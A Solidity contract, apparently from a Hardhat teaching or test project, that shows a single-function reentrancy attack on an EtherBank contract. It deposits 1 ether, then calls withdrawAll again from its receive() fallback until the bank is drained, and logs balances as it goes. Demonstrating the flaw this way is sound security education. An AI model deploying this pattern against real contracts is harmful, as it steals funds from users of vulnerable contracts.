// SPDX-License-Identifier: unlicensed
pragma solidity ^0.8.0;

import "./EtherBank.interface.sol";
import "hardhat/console.sol";

contract SingleFunctionAttacker {
    IEtherBank private etherBank;

    constructor() payable {}

    function setEtherBankAddress(address payable _etherBankAddress) external {
        etherBank = IEtherBank(_etherBankAddress);
    }

    receive() external payable {
        console.log("--------- Executing reentrancy attack ---------");
        console.log("Bank balance: %s", etherBank.getBalance() / 1 ether);
        console.log("Attacker balance: %s\n", address(this).balance / 1 ether);
        if (etherBank.getBalance() >= 1 ether) {
            etherBank.withdrawAll();
        }
    }

    function singleFunctionAttack() external payable {
        etherBank.deposit{value: 1 ether}();
        console.log(
            "Attacker's balance: %s\n",
            address(this).balance / 1 ether
        );
        etherBank.withdrawAll();
    }
}
